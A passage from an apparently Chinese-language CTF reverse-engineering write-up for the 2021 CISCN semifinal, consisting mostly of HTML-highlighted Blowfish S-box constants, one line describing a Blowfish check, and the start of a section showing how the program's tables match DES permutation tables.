class="number">0xF2F74EA7</span>L, <span class="number">0x361D2B3D</span>L, <span class="number">0x1939260F</span>L, <span class="number">0x19C27960</span>L,</span><br><span class="line">        <span class="number">0x5223A708</span>L, <span class="number">0xF71312B6</span>L, <span class="number">0xEBADFE6E</span>L, <span class="number">0xEAC31F66</span>L,</span><br><span class="line">        <span class="number">0xE3BC4595</span>L, <span class="number">0xA67BC883</span>L, <span class="number">0xB17F37D1</span>L, <span class="number">0x018CFF28</span>L,</span><br><span class="line">        <span class="number">0xC332DDEF</span>L, <span class="number">0xBE6C5AA5</span>L, <span class="number">0x65582185</span>L, <span class="number">0x68AB9802</span>L,</span><br><span class="line">        <span class="number">0xEECEA50F</span>L, <span class="number">0xDB2F953B</span>L, <span class="number">0x2AEF7DAD</span>L, <span class="number">0x5B6E2F84</span>L,</span><br><span class="line">        <span class="number">0x1521B628</span>L, <span class="number">0x29076170</span>L, <span class="number">0xECDD4775</span>L, <span class="number">0x619F1510</span>L,</span><br><span class="line">        <span class="number">0x13CCA830</span>L, <span class="number">0xEB61BD96</span>L, <span class="number">0x0334FE1E</span>L, <span class="number">0xAA0363CF</span>L,</span><br><span class="line">        <span class="number">0xB5735C90</span>L, <span class="number">0x4C70A239</span>L, <span class="number">0xD59E9E0B</span>L, <span class="number">0xCBAADE14</span>L,</span><br><span class="line">        <span class="number">0xEECC86BC</span>L, <span class="number">0x60622CA7</span>L, <span class="number">0x9CAB5CAB</span>L, <span class="number">0xB2F3846E</span>L,</span><br><span class="line">        <span class="number">0x648B1EAF</span>L, <span class="number">0x19BDF0CA</span>L, <span class="number">0xA02369B9</span>L, <span class="number">0x655ABB50</span>L,</span><br><span class="line">        <span class="number">0x40685A32</span>L, <span class="number">0x3C2AB4B3</span>L, <span class="number">0x319EE9D5</span>L, <span class="number">0xC021B8F7</span>L,</span><br><span class="line">        <span class="number">0x9B540B19</span>L, <span class="number">0x875FA099</span>L, <span class="number">0x95F7997E</span>L, <span class="number">0x623D7DA8</span>L,</span><br><span class="line">        <span class="number">0xF837889A</span>L, <span class="number">0x97E32D77</span>L, <span class="number">0x11ED935F</span>L, <span class="number">0x16681281</span>L,</span><br><span class="line">        <span class="number">0x0E358829</span>L, <span class="number">0xC7E61FD6</span>L, <span class="number">0x96DEDFA1</span>L, <span class="number">0x7858BA99</span>L,</span><br><span class="line">        <span class="number">0x57F584A5</span>L, <span class="number">0x1B227263</span>L, <span class="number">0x9B83C3FF</span>L, <span class="number">0x1AC24696</span>L,</span><br><span class="line">        <span class="number">0xCDB30AEB</span>L, <span class="number">0x532E3054</span>L, <span class="number">0x8FD948E4</span>L, <span class="number">0x6DBC3128</span>L,</span><br><span class="line">        <span class="number">0x58EBF2EF</span>L, <span class="number">0x34C6FFEA</span>L, <span class="number">0xFE28ED61</span>L, <span class="number">0xEE7C3C73</span>L,</span><br><span class="line">        <span class="number">0x5D4A14D9</span>L, <span class="number">0xE864B7E3</span>L, <span class="number">0x42105D14</span>L, <span class="number">0x203E13E0</span>L,</span><br><span class="line">        <span class="number">0x45EEE2B6</span>L, <span class="number">0xA3AAABEA</span>L, <span class="number">0xDB6C4F15</span>L, <span class="number">0xFACB4FD0</span>L,</span><br><span class="line">        <span class="number">0xC742F442</span>L, <span class="number">0xEF6ABBB5</span>L, <span class="number">0x654F3B1D</span>L, <span class="number">0x41CD2105</span>L,</span><br><span class="line">        <span class="number">0xD81E799E</span>L, <span class="number">0x86854DC7</span>L, <span class="number">0xE44B476A</span>L, <span class="number">0x3D816250</span>L,</span><br><span class="line">        <span class="number">0xCF62A1F2</span>L, <span class="number">0x5B8D2646</span>L, <span class="number">0xFC8883A0</span>L, <span class="number">0xC1C7B6A3</span>L,</span><br><span class="line">        <span class="number">0x7F1524C3</span>L, <span class="number">0x69CB7492</span>L, <span class="number">0x47848A0B</span>L, <span class="number">0x5692B285</span>L,</span><br><span class="line">        <span class="number">0x095BBF00</span>L, <span class="number">0xAD19489D</span>L, <span class="number">0x1462B174</span>L, <span class="number">0x23820E00</span>L,</span><br><span class="line">        <span class="number">0x58428D2A</span>L, <span class="number">0x0C55F5EA</span>L, <span class="number">0x1DADF43E</span>L, <span class="number">0x233F7061</span>L,</span><br><span class="line">        <span class="number">0x3372F092</span>L, <span class="number">0x8D937E41</span>L, <span class="number">0xD65FECF1</span>L, <span class="number">0x6C223BDB</span>L,</span><br><span class="line">        <span class="number">0x7CDE3759</span>L, <span class="number">0xCBEE7460</span>L, <span class="number">0x4085F2A7</span>L, <span class="number">0xCE77326E</span>L,</span><br><span class="line">        <span class="number">0xA6078084</span>L, <span class="number">0x19F8509E</span>L, <span class="number">0xE8EFD855</span>L, <span class="number">0x61D99735</span>L,</span><br><span class="line">        <span class="number">0xA969A7AA</span>L, <span class="number">0xC50C06C2</span>L, <span class="number">0x5A04ABFC</span>L, <span class="number">0x800BCADC</span>L,</span><br><span class="line">        <span class="number">0x9E447A2E</span>L, <span class="number">0xC3453484</span>L, <span class="number">0xFDD56705</span>L, <span class="number">0x0E1E9EC9</span>L,</span><br><span class="line">        <span class="number">0xDB73DBD3</span>L, <span class="number">0x105588CD</span>L, <span class="number">0x675FDA79</span>L, <span class="number">0xE3674340</span>L,</span><br><span class="line">        <span class="number">0xC5C43465</span>L, <span class="number">0x713E38D8</span>L, <span class="number">0x3D28F89E</span>L, <span class="number">0xF16DFF20</span>L,</span><br><span class="line">        <span class="number">0x153E21E7</span>L, <span class="number">0x8FB03D4A</span>L, <span class="number">0xE6E39F2B</span>L, <span class="number">0xDB83ADF7</span>L   &#125;,</span><br><span class="line">    &#123;   <span class="number">0xE93D5A68</span>L, <span class="number">0x948140F7</span>L, <span class="number">0xF64C261C</span>L, <span class="number">0x94692934</span>L,</span><br><span class="line">        <span class="number">0x411520F7</span>L, <span class="number">0x7602D4F7</span>L, <span class="number">0xBCF46B2E</span>L, <span class="number">0xD4A20068</span>L,</span><br><span class="line">        <span class="number">0xD4082471</span>L, <span class="number">0x3320F46A</span>L, <span class="number">0x43B7D4B7</span>L, <span class="number">0x500061AF</span>L,</span><br><span class="line">        <span class="number">0x1E39F62E</span>L, <span class="number">0x97244546</span>L, <span class="number">0x14214F74</span>L, <span class="number">0xBF8B8840</span>L,</span><br><span class="line">        <span class="number">0x4D95FC1D</span>L, <span class="number">0x96B591AF</span>L, <span class="number">0x70F4DDD3</span>L, <span class="number">0x66A02F45</span>L,</span><br><span class="line">        <span class="number">0xBFBC09EC</span>L, <span class="number">0x03BD9785</span>L, <span class="number">0x7FAC6DD0</span>L, <span class="number">0x31CB8504</span>L,</span><br><span class="line">        <span class="number">0x96EB27B3</span>L, <span class="number">0x55FD3941</span>L, <span class="number">0xDA2547E6</span>L, <span class="number">0xABCA0A9A</span>L,</span><br><span class="line">        <span class="number">0x28507825</span>L, <span class="number">0x530429F4</span>L, <span class="number">0x0A2C86DA</span>L, <span class="number">0xE9B66DFB</span>L,</span><br><span class="line">        <span class="number">0x68DC1462</span>L, <span class="number">0xD7486900</span>L, <span class="number">0x680EC0A4</span>L, <span class="number">0x27A18DEE</span>L,</span><br><span class="line">        <span class="number">0x4F3FFEA2</span>L, <span class="number">0xE887AD8C</span>L, <span class="number">0xB58CE006</span>L, <span class="number">0x7AF4D6B6</span>L,</span><br><span class="line">        <span class="number">0xAACE1E7C</span>L, <span class="number">0xD3375FEC</span>L, <span class="number">0xCE78A399</span>L, <span class="number">0x406B2A42</span>L,</span><br><span class="line">        <span class="number">0x20FE9E35</span>L, <span class="number">0xD9F385B9</span>L, <span class="number">0xEE39D7AB</span>L, <span class="number">0x3B124E8B</span>L,</span><br><span class="line">        <span class="number">0x1DC9FAF7</span>L, <span class="number">0x4B6D1856</span>L, <span class="number">0x26A36631</span>L, <span class="number">0xEAE397B2</span>L,</span><br><span class="line">        <span class="number">0x3A6EFA74</span>L, <span class="number">0xDD5B4332</span>L, <span class="number">0x6841E7F7</span>L, <span class="number">0xCA7820FB</span>L,</span><br><span class="line">        <span class="number">0xFB0AF54E</span>L, <span class="number">0xD8FEB397</span>L, <span class="number">0x454056AC</span>L, <span class="number">0xBA489527</span>L,</span><br><span class="line">        <span class="number">0x55533A3A</span>L, <span class="number">0x20838D87</span>L, <span class="number">0xFE6BA9B7</span>L, <span class="number">0xD096954B</span>L,</span><br><span class="line">        <span class="number">0x55A867BC</span>L, <span class="number">0xA1159A58</span>L, <span class="number">0xCCA92963</span>L, <span class="number">0x99E1DB33</span>L,</span><br><span class="line">        <span class="number">0xA62A4A56</span>L, <span class="number">0x3F3125F9</span>L, <span class="number">0x5EF47E1C</span>L, <span class="number">0x9029317C</span>L,</span><br><span class="line">        <span class="number">0xFDF8E802</span>L, <span class="number">0x04272F70</span>L, <span class="number">0x80BB155C</span>L, <span class="number">0x05282CE3</span>L,</span><br><span class="line">        <span class="number">0x95C11548</span>L, <span class="number">0xE4C66D22</span>L, <span class="number">0x48C1133F</span>L, <span class="number">0xC70F86DC</span>L,</span><br><span class="line">        <span class="number">0x07F9C9EE</span>L, <span class="number">0x41041F0F</span>L, <span class="number">0x404779A4</span>L, <span class="number">0x5D886E17</span>L,</span><br><span class="line">        <span class="number">0x325F51EB</span>L, <span class="number">0xD59BC0D1</span>L, <span class="number">0xF2BCC18F</span>L, <span class="number">0x41113564</span>L,</span><br><span class="line">        <span class="number">0x257B7834</span>L, <span class="number">0x602A9C60</span>L, <span class="number">0xDFF8E8A3</span>L, <span class="number">0x1F636C1B</span>L,</span><br><span class="line">        <span class="number">0x0E12B4C2</span>L, <span class="number">0x02E1329E</span>L, <span class="number">0xAF664FD1</span>L, <span class="number">0xCAD18115</span>L,</span><br><span class="line">        <span class="number">0x6B2395E0</span>L, <span class="number">0x333E92E1</span>L, <span class="number">0x3B240B62</span>L, <span class="number">0xEEBEB922</span>L,</span><br><span class="line">        <span class="number">0x85B2A20E</span>L, <span class="number">0xE6BA0D99</span>L, <span class="number">0xDE720C8C</span>L, <span class="number">0x2DA2F728</span>L,</span><br><span class="line">        <span class="number">0xD0127845</span>L, <span class="number">0x95B794FD</span>L, <span class="number">0x647D0862</span>L, <span class="number">0xE7CCF5F0</span>L,</span><br><span class="line">        <span class="number">0x5449A36F</span>L, <span class="number">0x877D48FA</span>L, <span class="number">0xC39DFD27</span>L, <span class="number">0xF33E8D1E</span>L,</span><br><span class="line">        <span class="number">0x0A476341</span>L, <span class="number">0x992EFF74</span>L, <span class="number">0x3A6F6EAB</span>L, <span class="number">0xF4F8FD37</span>L,</span><br><span class="line">        <span class="number">0xA812DC60</span>L, <span class="number">0xA1EBDDF8</span>L, <span class="number">0x991BE14C</span>L, <span class="number">0xDB6E6B0D</span>L,</span><br><span class="line">        <span class="number">0xC67B5510</span>L, <span class="number">0x6D672C37</span>L, <span class="number">0x2765D43B</span>L, <span class="number">0xDCD0E804</span>L,</span><br><span class="line">        <span class="number">0xF1290DC7</span>L, <span class="number">0xCC00FFA3</span>L, <span class="number">0xB5390F92</span>L, <span class="number">0x690FED0B</span>L,</span><br><span class="line">        <span class="number">0x667B9FFB</span>L, <span class="number">0xCEDB7D9C</span>L, <span class="number">0xA091CF0B</span>L, <span class="number">0xD9155EA3</span>L,</span><br><span class="line">        <span class="number">0xBB132F88</span>L, <span class="number">0x515BAD24</span>L, <span class="number">0x7B9479BF</span>L, <span class="number">0x763BD6EB</span>L,</span><br><span class="line">        <span class="number">0x37392EB3</span>L, <span class="number">0xCC115979</span>L, <span class="number">0x8026E297</span>L, <span class="number">0xF42E312D</span>L,</span><br><span class="line">        <span class="number">0x6842ADA7</span>L, <span class="number">0xC66A2B3B</span>L, <span class="number">0x12754CCC</span>L, <span class="number">0x782EF11C</span>L,</span><br><span class="line">        <span class="number">0x6A124237</span>L, <span class="number">0xB79251E7</span>L, <span class="number">0x06A1BBE6</span>L, <span class="number">0x4BFB6350</span>L,</span><br><span class="line">        <span class="number">0x1A6B1018</span>L, <span class="number">0x11CAEDFA</span>L, <span class="number">0x3D25BDD8</span>L, <span class="number">0xE2E1C3C9</span>L,</span><br><span class="line">        <span class="number">0x44421659</span>L, <span class="number">0x0A121386</span>L, <span class="number">0xD90CEC6E</span>L, <span class="number">0xD5ABEA2A</span>L,</span><br><span class="line">        <span class="number">0x64AF674E</span>L, <span class="number">0xDA86A85F</span>L, <span class="number">0xBEBFE988</span>L, <span class="number">0x64E4C3FE</span>L,</span><br><span class="line">        <span class="number">0x9DBC8057</span>L, <span class="number">0xF0F7C086</span>L, <span class="number">0x60787BF8</span>L, <span class="number">0x6003604D</span>L,</span><br><span class="line">        <span class="number">0xD1FD8346</span>L, <span class="number">0xF6381FB0</span>L, <span class="number">0x7745AE04</span>L, <span class="number">0xD736FCCC</span>L,</span><br><span class="line">        <span class="number">0x83426B33</span>L, <span class="number">0xF01EAB71</span>L, <span class="number">0xB0804187</span>L, <span class="number">0x3C005E5F</span>L,</span><br><span class="line">        <span class="number">0x77A057BE</span>L, <span class="number">0xBDE8AE24</span>L, <span class="number">0x55464299</span>L, <span class="number">0xBF582E61</span>L,</span><br><span class="line">        <span class="number">0x4E58F48F</span>L, <span class="number">0xF2DDFDA2</span>L, <span class="number">0xF474EF38</span>L, <span class="number">0x8789BDC2</span>L,</span><br><span class="line">        <span class="number">0x5366F9C3</span>L, <span class="number">0xC8B38E74</span>L, <span class="number">0xB475F255</span>L, <span class="number">0x46FCD9B9</span>L,</span><br><span class="line">        <span class="number">0x7AEB2661</span>L, <span class="number">0x8B1DDF84</span>L, <span class="number">0x846A0E79</span>L, <span class="number">0x915F95E2</span>L,</span><br><span class="line">        <span class="number">0x466E598E</span>L, <span class="number">0x20B45770</span>L, <span class="number">0x8CD55591</span>L, <span class="number">0xC902DE4C</span>L,</span><br><span class="line">        <span class="number">0xB90BACE1</span>L, <span class="number">0xBB8205D0</span>L, <span class="number">0x11A86248</span>L, <span class="number">0x7574A99E</span>L,</span><br><span class="line">        <span class="number">0xB77F19B6</span>L, <span class="number">0xE0A9DC09</span>L, <span class="number">0x662D09A1</span>L, <span class="number">0xC4324633</span>L,</span><br><span class="line">        <span class="number">0xE85A1F02</span>L, <span class="number">0x09F0BE8C</span>L, <span class="number">0x4A99A025</span>L, <span class="number">0x1D6EFE10</span>L,</span><br><span class="line">        <span class="number">0x1AB93D1D</span>L, <span class="number">0x0BA5A4DF</span>L, <span class="number">0xA186F20F</span>L, <span class="number">0x2868F169</span>L,</span><br><span class="line">        <span class="number">0xDCB7DA83</span>L, <span class="number">0x573906FE</span>L, <span class="number">0xA1E2CE9B</span>L, <span class="number">0x4FCD7F52</span>L,</span><br><span class="line">        <span class="number">0x50115E01</span>L, <span class="number">0xA70683FA</span>L, <span class="number">0xA002B5C4</span>L, <span class="number">0x0DE6D027</span>L,</span><br><span class="line">        <span class="number">0x9AF88C27</span>L, <span class="number">0x773F8641</span>L, <span class="number">0xC3604C06</span>L, <span class="number">0x61A806B5</span>L,</span><br><span class="line">        <span class="number">0xF0177A28</span>L, <span class="number">0xC0F586E0</span>L, <span class="number">0x006058AA</span>L, <span class="number">0x30DC7D62</span>L,</span><br><span class="line">        <span class="number">0x11E69ED7</span>L, <span class="number">0x2338EA63</span>L, <span class="number">0x53C2DD94</span>L, <span class="number">0xC2C21634</span>L,</span><br><span class="line">        <span class="number">0xBBCBEE56</span>L, <span class="number">0x90BCB6DE</span>L, <span class="number">0xEBFC7DA1</span>L, <span class="number">0xCE591D76</span>L,</span><br><span class="line">        <span class="number">0x6F05E409</span>L, <span class="number">0x4B7C0188</span>L, <span class="number">0x39720A3D</span>L, <span class="number">0x7C927C24</span>L,</span><br><span class="line">        <span class="number">0x86E3725F</span>L, <span class="number">0x724D9DB9</span>L, <span class="number">0x1AC15BB4</span>L, <span class="number">0xD39EB8FC</span>L,</span><br><span class="line">        <span class="number">0xED545578</span>L, <span class="number">0x08FCA5B5</span>L, <span class="number">0xD83D7CD3</span>L, <span class="number">0x4DAD0FC4</span>L,</span><br><span class="line">        <span class="number">0x1E50EF5E</span>L, <span class="number">0xB161E6F8</span>L, <span class="number">0xA28514D9</span>L, <span class="number">0x6C51133C</span>L,</span><br><span class="line">        <span class="number">0x6FD5C7E7</span>L, <span class="number">0x56E14EC4</span>L, <span class="number">0x362ABFCE</span>L, <span class="number">0xDDC6C837</span>L,</span><br><span class="line">        <span class="number">0xD79A3234</span>L, <span class="number">0x92638212</span>L, <span class="number">0x670EFA8E</span>L, <span class="number">0x406000E0</span>L  &#125;,</span><br><span class="line">    &#123;   <span class="number">0x3A39CE37</span>L, <span class="number">0xD3FAF5CF</span>L, <span class="number">0xABC27737</span>L, <span class="number">0x5AC52D1B</span>L,</span><br><span class="line">        <span class="number">0x5CB0679E</span>L, <span class="number">0x4FA33742</span>L, <span class="number">0xD3822740</span>L, <span class="number">0x99BC9BBE</span>L,</span><br><span class="line">        <span class="number">0xD5118E9D</span>L, <span class="number">0xBF0F7315</span>L, <span class="number">0xD62D1C7E</span>L, <span class="number">0xC700C47B</span>L,</span><br><span class="line">        <span class="number">0xB78C1B6B</span>L, <span class="number">0x21A19045</span>L, <span class="number">0xB26EB1BE</span>L, <span class="number">0x6A366EB4</span>L,</span><br><span class="line">        <span class="number">0x5748AB2F</span>L, <span class="number">0xBC946E79</span>L, <span class="number">0xC6A376D2</span>L, <span class="number">0x6549C2C8</span>L,</span><br><span class="line">        <span class="number">0x530FF8EE</span>L, <span class="number">0x468DDE7D</span>L, <span class="number">0xD5730A1D</span>L, <span class="number">0x4CD04DC6</span>L,</span><br><span class="line">        <span class="number">0x2939BBDB</span>L, <span class="number">0xA9BA4650</span>L, <span class="number">0xAC9526E8</span>L, <span class="number">0xBE5EE304</span>L,</span><br><span class="line">        <span class="number">0xA1FAD5F0</span>L, <span class="number">0x6A2D519A</span>L, <span class="number">0x63EF8CE2</span>L, <span class="number">0x9A86EE22</span>L,</span><br><span class="line">        <span class="number">0xC089C2B8</span>L, <span class="number">0x43242EF6</span>L, <span class="number">0xA51E03AA</span>L, <span class="number">0x9CF2D0A4</span>L,</span><br><span class="line">        <span class="number">0x83C061BA</span>L, <span class="number">0x9BE96A4D</span>L, <span class="number">0x8FE51550</span>L, <span class="number">0xBA645BD6</span>L,</span><br><span class="line">        <span class="number">0x2826A2F9</span>L, <span class="number">0xA73A3AE1</span>L, <span class="number">0x4BA99586</span>L, <span class="number">0xEF5562E9</span>L,</span><br><span class="line">        <span class="number">0xC72FEFD3</span>L, <span class="number">0xF752F7DA</span>L, <span class="number">0x3F046F69</span>L, <span class="number">0x77FA0A59</span>L,</span><br><span class="line">        <span class="number">0x80E4A915</span>L, <span class="number">0x87B08601</span>L, <span class="number">0x9B09E6AD</span>L, <span class="number">0x3B3EE593</span>L,</span><br><span class="line">        <span class="number">0xE990FD5A</span>L, <span class="number">0x9E34D797</span>L, <span class="number">0x2CF0B7D9</span>L, <span class="number">0x022B8B51</span>L,</span><br><span class="line">        <span class="number">0x96D5AC3A</span>L, <span class="number">0x017DA67D</span>L, <span class="number">0xD1CF3ED6</span>L, <span class="number">0x7C7D2D28</span>L,</span><br><span class="line">        <span class="number">0x1F9F25CF</span>L, <span class="number">0xADF2B89B</span>L, <span class="number">0x5AD6B472</span>L, <span class="number">0x5A88F54C</span>L,</span><br><span class="line">        <span class="number">0xE029AC71</span>L, <span class="number">0xE019A5E6</span>L, <span class="number">0x47B0ACFD</span>L, <span class="number">0xED93FA9B</span>L,</span><br><span class="line">        <span class="number">0xE8D3C48D</span>L, <span class="number">0x283B57CC</span>L, <span class="number">0xF8D56629</span>L, <span class="number">0x79132E28</span>L,</span><br><span class="line">        <span class="number">0x785F0191</span>L, <span class="number">0xED756055</span>L, <span class="number">0xF7960E44</span>L, <span class="number">0xE3D35E8C</span>L,</span><br><span class="line">        <span class="number">0x15056DD4</span>L, <span class="number">0x88F46DBA</span>L, <span class="number">0x03A16125</span>L, <span class="number">0x0564F0BD</span>L,</span><br><span class="line">        <span class="number">0xC3EB9E15</span>L, <span class="number">0x3C9057A2</span>L, <span class="number">0x97271AEC</span>L, <span class="number">0xA93A072A</span>L,</span><br><span class="line">        <span class="number">0x1B3F6D9B</span>L, <span class="number">0x1E6321F5</span>L, <span class="number">0xF59C66FB</span>L, <span class="number">0x26DCF319</span>L,</span><br><span class="line">        <span class="number">0x7533D928</span>L, <span class="number">0xB155FDF5</span>L, <span class="number">0x03563482</span>L, <span class="number">0x8ABA3CBB</span>L,</span><br><span class="line">        <span class="number">0x28517711</span>L, <span class="number">0xC20AD9F8</span>L, <span class="number">0xABCC5167</span>L, <span class="number">0xCCAD925F</span>L,</span><br><span class="line">        <span class="number">0x4DE81751</span>L, <span class="number">0x3830DC8E</span>L, <span class="number">0x379D5862</span>L, <span class="number">0x9320F991</span>L,</span><br><span class="line">        <span class="number">0xEA7A90C2</span>L, <span class="number">0xFB3E7BCE</span>L, <span class="number">0x5121CE64</span>L, <span class="number">0x774FBE32</span>L,</span><br><span class="line">        <span class="number">0xA8B6E37E</span>L, <span class="number">0xC3293D46</span>L, <span class="number">0x48DE5369</span>L, <span class="number">0x6413E680</span>L,</span><br><span class="line">        <span class="number">0xA2AE0810</span>L, <span class="number">0xDD6DB224</span>L, <span class="number">0x69852DFD</span>L, <span class="number">0x09072166</span>L,</span><br><span class="line">        <span class="number">0xB39A460A</span>L, <span class="number">0x6445C0DD</span>L, <span class="number">0x586CDECF</span>L, <span class="number">0x1C20C8AE</span>L,</span><br><span class="line">        <span class="number">0x5BBEF7DD</span>L, <span class="number">0x1B588D40</span>L, <span class="number">0xCCD2017F</span>L, <span class="number">0x6BB4E3BB</span>L,</span><br><span class="line">        <span class="number">0xDDA26A7E</span>L, <span class="number">0x3A59FF45</span>L, <span class="number">0x3E350A44</span>L, <span class="number">0xBCB4CDD5</span>L,</span><br><span class="line">        <span class="number">0x72EACEA8</span>L, <span class="number">0xFA6484BB</span>L, <span class="number">0x8D6612AE</span>L, <span class="number">0xBF3C6F47</span>L,</span><br><span class="line">        <span class="number">0xD29BE463</span>L, <span class="number">0x542F5D9E</span>L, <span class="number">0xAEC2771B</span>L, <span class="number">0xF64E6370</span>L,</span><br><span class="line">        <span class="number">0x740E0D8D</span>L, <span class="number">0xE75B1357</span>L, <span class="number">0xF8721671</span>L, <span class="number">0xAF537D5D</span>L,</span><br><span class="line">        <span class="number">0x4040CB08</span>L, <span class="number">0x4EB4E2CC</span>L, <span class="number">0x34D2466A</span>L, <span class="number">0x0115AF84</span>L,</span><br><span class="line">        <span class="number">0xE1B00428</span>L, <span class="number">0x95983A1D</span>L, <span class="number">0x06B89FB4</span>L, <span class="number">0xCE6EA048</span>L,</span><br><span class="line">        <span class="number">0x6F3F3B82</span>L, <span class="number">0x3520AB82</span>L, <span class="number">0x011A1D4B</span>L, <span class="number">0x277227F8</span>L,</span><br><span class="line">        <span class="number">0x611560B1</span>L, <span class="number">0xE7933FDC</span>L, <span class="number">0xBB3A792B</span>L, <span class="number">0x344525BD</span>L,</span><br><span class="line">        <span class="number">0xA08839E1</span>L, <span class="number">0x51CE794B</span>L, <span class="number">0x2F32C9B7</span>L, <span class="number">0xA01FBAC9</span>L,</span><br><span class="line">        <span class="number">0xE01CC87E</span>L, <span class="number">0xBCC7D1F6</span>L, <span class="number">0xCF0111C3</span>L, <span class="number">0xA1E8AAC7</span>L,</span><br><span class="line">        <span class="number">0x1A908749</span>L, <span class="number">0xD44FBD9A</span>L, <span class="number">0xD0DADECB</span>L, <span class="number">0xD50ADA38</span>L,</span><br><span class="line">        <span class="number">0x0339C32A</span>L, <span class="number">0xC6913667</span>L, <span class="number">0x8DF9317C</span>L, <span class="number">0xE0B12B4F</span>L,</span><br><span class="line">        <span class="number">0xF79E59B7</span>L, <span class="number">0x43F5BB3A</span>L, <span class="number">0xF2D519FF</span>L, <span class="number">0x27D9459C</span>L,</span><br><span class="line">        <span class="number">0xBF97222C</span>L, <span class="number">0x15E6FC2A</span>L, <span class="number">0x0F91FC71</span>L, <span class="number">0x9B941525</span>L,</span><br><span class="line">        <span class="number">0xFAE59361</span>L, <span class="number">0xCEB69CEB</span>L, <span class="number">0xC2A86459</span>L, <span class="number">0x12BAA8D1</span>L,</span><br><span class="line">        <span class="number">0xB6C1075E</span>L, <span class="number">0xE3056A0C</span>L, <span class="number">0x10D25065</span>L, <span class="number">0xCB03A442</span>L,</span><br><span class="line">        <span class="number">0xE0EC6E0E</span>L, <span class="number">0x1698DB3B</span>L, <span class="number">0x4C98A0BE</span>L, <span class="number">0x3278E964</span>L,</span><br><span class="line">        <span class="number">0x9F1F9532</span>L, <span class="number">0xE0D392DF</span>L, <span class="number">0xD3A0342B</span>L, <span class="number">0x8971F21E</span>L,</span><br><span class="line">        <span class="number">0x1B0A7441</span>L, <span class="number">0x4BA3348C</span>L, <span class="number">0xC5BE7120</span>L, <span class="number">0xC37632D8</span>L,</span><br><span class="line">        <span class="number">0xDF359F8D</span>L, <span class="number">0x9B992F2E</span>L, <span class="number">0xE60B6F47</span>L, <span class="number">0x0FE3F11D</span>L,</span><br><span class="line">        <span class="number">0xE54CDA54</span>L, <span class="number">0x1EDAD891</span>L, <span class="number">0xCE6279CF</span>L, <span class="number">0xCD3E7E6F</span>L,</span><br><span class="line">        <span class="number">0x1618B166</span>L, <span class="number">0xFD2C1D05</span>L, <span class="number">0x848FD2C5</span>L, <span class="number">0xF6FB2299</span>L,</span><br><span class="line">        <span class="number">0xF523F357</span>L, <span class="number">0xA6327623</span>L, <span class="number">0x93A83531</span>L, <span class="number">0x56CCCD02</span>L,</span><br><span class="line">        <span class="number">0xACF08162</span>L, <span class="number">0x5A75EBB5</span>L, <span class="number">0x6E163697</span>L, <span class="number">0x88D273CC</span>L,</span><br><span class="line">        <span class="number">0xDE966292</span>L, <span class="number">0x81B949D0</span>L, <span class="number">0x4C50901B</span>L, <span class="number">0x71C65614</span>L,</span><br><span class="line">        <span class="number">0xE6C6C7BD</span>L, <span class="number">0x327A140A</span>L, <span class="number">0x45E1D006</span>L, <span class="number">0xC3F27B9A</span>L,</span><br><span class="line">        <span class="number">0xC9AA53FD</span>L, <span class="number">0x62A80F00</span>L, <span class="number">0xBB25BFE2</span>L, <span class="number">0x35BDD2F6</span>L,</span><br><span class="line">        <span class="number">0x71126905</span>L, <span class="number">0xB2040222</span>L, <span class="number">0xB6CBCF7C</span>L, <span class="number">0xCD769C2B</span>L,</span><br><span class="line">        <span class="number">0x53113EC0</span>L, <span class="number">0x1640E3D3</span>L, <span class="number">0x38ABBD60</span>L, <span class="number">0x2547ADF0</span>L,</span><br><span class="line">        <span class="number">0xBA38209C</span>L, <span class="number">0xF746CE76</span>L, <span class="number">0x77AFA1C5</span>L, <span class="number">0x20756060</span>L,</span><br><span class="line">        <span class="number">0x85CBFE4E</span>L, <span class="number">0x8AE88DD8</span>L, <span class="number">0x7AAAF9B0</span>L, <span class="number">0x4CF9AA7E</span>L,</span><br><span class="line">        <span class="number">0x1948C25C</span>L, <span class="number">0x02FB8A8C</span>L, <span class="number">0x01C36AE4</span>L, <span class="number">0xD6EBE1F9</span>L,</span><br><span class="line">        <span class="number">0x90D4F869</span>L, <span class="number">0xA65CDEA0</span>L, <span class="number">0x3F09252D</span>L, <span class="number">0xC208E69F</span>L,</span><br><span class="line">        <span class="number">0xB74E6132</span>L, <span class="number">0xCE77E25B</span>L, <span class="number">0x578FDFE3</span>L, <span class="number">0x3AC372E6</span>L  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0xACu, 0xDDu, (__int64)v5)</span></span><br><span class="line">Blowfish(text=<span class="string">&quot;Decrypt!&quot;</span>,key=STRING[<span class="number">0</span>:<span class="number">8</span>])==[<span class="number">0x06</span>, <span class="number">0x8F</span>, <span class="number">0x5A</span>, <span class="number">0xFF</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0xE9</span>, <span class="number">0x0B</span>]</span><br></pre></td></tr></table></figure><h3 id="对称密码-DES"><a href="#对称密码-DES" class="headerlink" title="[对称密码] DES"></a>[对称密码] DES</h3><blockquote><p>具体实现：<a href="https://github.com/c10udlnk/myReverseExps/blob/main/_CRYPTO_/DES.cpp">myReverseExps&#x2F;DES.cpp at main · c10udlnk&#x2F;myReverseExps</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0xB5u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711215401464.png"></p><p>在<code>sub_401620() -&gt; sub_4107A0()</code>里可以看到这四个<code>memcpy()</code>的地方用到了跟关键常量差不多的数组（依次是<code>Rotate_Table[1:17]</code>、<code>PC1_Table</code>各值-1，<code>IP_Table</code>各值+4、<code>PC2_Table</code>各值-1）：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711215458780.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 